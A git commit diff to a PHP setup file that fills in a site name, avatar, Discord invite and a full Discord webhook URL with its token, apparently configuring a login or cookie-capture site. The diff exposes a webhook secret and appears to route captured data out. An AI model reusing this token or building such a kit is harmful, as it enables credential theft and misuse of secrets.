d61e0af2e013b4bc3ae6bffff0851fe1d59966f2
Yyyyyy667 <109990918+Yyyyyy667@users.noreply.github.com>
2024-01-22 16:50:41 -0500

    setup.php

--- setup.php
+++ setup.php
@@ -1,9 +1,9 @@
 <?php
-$siteName = 'BTermed'; # ur name
+$siteName = 'Cookie X Jefe'; # ur name
 $mainpfp = 'https://64.media.tumblr.com/e03002d37b95a53a3a030a889bafeabf/f39306d72ab83515-d3/s540x810/b5dd6e56b8f40dca18ab547b61ac449b48aa30c1.jpg'; # ur profile picture
 $embedColor = 'FF9ACD'; # embed color 
-$discord = 'https://discord.com/invite/yourserver'; # ur discord server
-$Dwebhook = 'YOURDISCORDWEBHOOK'; # Ur discord webhook here 
+$discord = 'https://discord.gg/YKEqyqCEBg'; # ur discord server
+$Dwebhook = 'https://discord.com/api/webhooks/1199108558717993102/NdyORG_IIkxwEC7PbYxXQYK8d3fF_8ir4paQ229vQ8CckxnOD1Ss7p0M5LYesGY19LXk'; # Ur discord webhook here 
 $loginColor = [
     "themeColor" => "dark",
 ];
